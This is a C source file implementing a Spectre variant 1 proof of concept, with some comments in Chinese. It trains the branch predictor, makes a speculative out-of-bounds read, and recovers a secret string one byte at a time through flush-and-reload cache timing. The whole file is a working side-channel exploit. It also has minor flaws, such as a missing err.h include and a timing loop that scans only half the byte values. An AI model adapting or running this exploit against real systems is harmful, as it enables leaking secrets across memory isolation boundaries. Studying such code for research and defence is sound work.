#define _GNU_SOURCE
#include <stdint.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <assert.h>
#include <x86intrin.h> /* for rdtscp and clflush */ 

void pin_task_to(int pid, int cpu) {
	cpu_set_t cset;
	CPU_ZERO(&cset);
	CPU_SET(cpu, &cset);
	if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))
		err(1, "affinity");
}
void pin_to(int cpu) { pin_task_to(0, cpu); }

unsigned int array1_size = 16;
 uint8_t array1[160] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }; /* 初始化array1数组，并至初始化数组前16个值，申请了160个int地址空间 */
 uint8_t array2[256 * 512];

 char *secret = "AB"; /* 设置密文字符串，存储在cpu内存中 */
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

 void victim_function(size_t x) {
 	if (x < array1_size) {
 		temp &= array2[array1[x] * 512];
 	}
 }


 #define CACHE_HIT_THRESHOLD (50)  
 int readMemoryByte(size_t offset) {
 	static int results[256] = {0};
 	int tries, i, j, k, tmp, result, junk = 0;
	size_t training_x, x;
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;

 	for (i = 0; i < 256; i++)
 		results[i] = 0;

	/* loops: 大循环找出最高命中字节 */
	for (tries = 999; tries > 0; tries--) {
	 	/* Flush array2[256*(0..255)] from cache */
	 	for (i = 0; i < 256; i++) 
	 		_mm_clflush(&array2[i * 512]); 


	 	training_x = tries % array1_size; 
	 	/* loops: 训练CPU的分支预测 */
	 	for(j = 999; j >= 0; j--) {
		 	_mm_clflush(&array1_size);
	
			/* 内存屏障防止乱序 */
			for(volatile int z = 0; z < 100; z++) {} 
		
		 	/* Call the victim! */
		 	victim_function(training_x); 
	 	}

		/* OOB attack */
		victim_function(offset);

	 	/* Time reads. Order is lightly mixed up to prevent stride prediction */
 		for (i = 0; i < 128; i++) {
	 		addr = &array2[i * 512]; 
	 		time1 = __rdtscp(&junk); /* READ TIMER */ 
	 		junk = *addr; /* MEMORY ACCESS TO TIME */ 
	 		time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
	 		if (time2 <= CACHE_HIT_THRESHOLD && i != array1[training_x]) { 
				results[i]++; /* cache hit - add +1 to score for this value */
			}
		}
 	}

	tmp = results[0];
	result = 0;
	for ( i = 0; i < 256; i++ ) {
		if (results[i] > tmp ) {
			tmp = results[i];
			result = i;
		}
	} 

 	return result;
 }

int main(int argc, const char **argv) {
    /* offset of array1 to secret */    
	size_t offset = (size_t)(secret - (char *)array1); /* default for malicious_x */
        
	int i, score, len = 2, main_cpu = 1; 
    for (i = 0; i < sizeof(array2); i++)
   		array2[i] = 1; 

	pin_to(main_cpu);
	printf("array1 address = %p, secret address = %p\n", (char *)array1, secret);
	printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		printf("Reading at offset = %llx", offset);
		score = readMemoryByte(offset++);
		if (score != 0) 
			printf(" = ’%c’", score );
		printf("\n");
	}
	return (0);
}

